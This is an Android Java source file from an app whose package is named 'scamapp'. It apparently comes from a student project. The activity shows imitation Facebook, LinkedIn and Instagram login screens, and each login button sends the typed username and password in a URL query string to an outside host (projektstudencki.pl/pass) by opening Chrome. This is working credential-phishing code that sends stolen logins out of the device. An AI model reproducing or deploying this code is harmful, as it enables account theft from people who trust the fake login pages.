package com.example.scamapp;

import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.app.AppCompatDialogFragment;

import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.TextView;

import com.google.android.material.button.MaterialButton;

public class MainActivity3 extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = getIntent();
        String command = intent.getStringExtra("command");
        hideTitleBar();
        if (command.equals("")) {
            setContentView(R.layout.activity_main_background);
            openDialog();
        }

        else {
            TextView username;
            TextView password;
            MaterialButton loginBtn;
            if (command.equals("Facebook")) {
                setContentView(R.layout.facebook);
                username = (TextView) findViewById(R.id.username);
                password = (TextView) findViewById(R.id.password);
                loginBtn = (MaterialButton) findViewById(R.id.loginbtn);
                TextView finalUsername1 = username;
                TextView finalPassword1 = password;
                loginBtn.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        runChrome(command + ":" + finalUsername1.getText().toString() + "," + finalPassword1.getText().toString());
                    }
                });

            }
            if (command.equals("Linkedin")) {
                setContentView(R.layout.insta);
                username = (TextView) findViewById(R.id.username);
                password = (TextView) findViewById(R.id.password);
                loginBtn = (MaterialButton) findViewById(R.id.loginbtn);
                TextView finalUsername = username;
                TextView finalPassword = password;
                loginBtn.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        runChrome(command + ":" + finalUsername.getText().toString() + "," + finalPassword.getText().toString());
                    }
                });
            }
            if (command.equals("Insta")) {
                setContentView(R.layout.insta);
                username = (TextView) findViewById(R.id.username);
                password = (TextView) findViewById(R.id.password);
                loginBtn = (MaterialButton) findViewById(R.id.loginbtn);
                TextView finalUsername2 = username;
                TextView finalPassword2 = password;
                loginBtn.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        runChrome(command + ":" + finalUsername2.getText().toString() + "," + finalPassword2.getText().toString());
                    }
                });
            }

        }
    }
    public void runChrome(String dataToSend) {

        final String url = "https://s444471.projektstudencki.pl/pass?data=" + dataToSend;
        final Uri uri = Uri.parse("googlechrome://navigate?url=" + url);
        Intent intent = new Intent(Intent.ACTION_VIEW, uri);
        intent.setPackage("com.android.chrome");
        //Intent service = new Intent(getApplicationContext(), MyService.class);
        startActivity(intent);
        finish();
    }

        public void hideTitleBar () {
            requestWindowFeature(Window.FEATURE_NO_TITLE);
            this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
            getSupportActionBar().hide();
        }

        public String getCommandFromPath(String input){
            String command = "";
            int indexOfEquals = input.indexOf("=");

            if (indexOfEquals >= 0 && indexOfEquals < input.length() - 1) {
                command = input.substring(indexOfEquals + 1);
            }
            return command;

        }


    public void openDialog() {
        com.example.application.example.ExampleDialog exampleDialog = new com.example.application.example.ExampleDialog();
        exampleDialog.show(getSupportFragmentManager(), "example dialog");
    }
    }
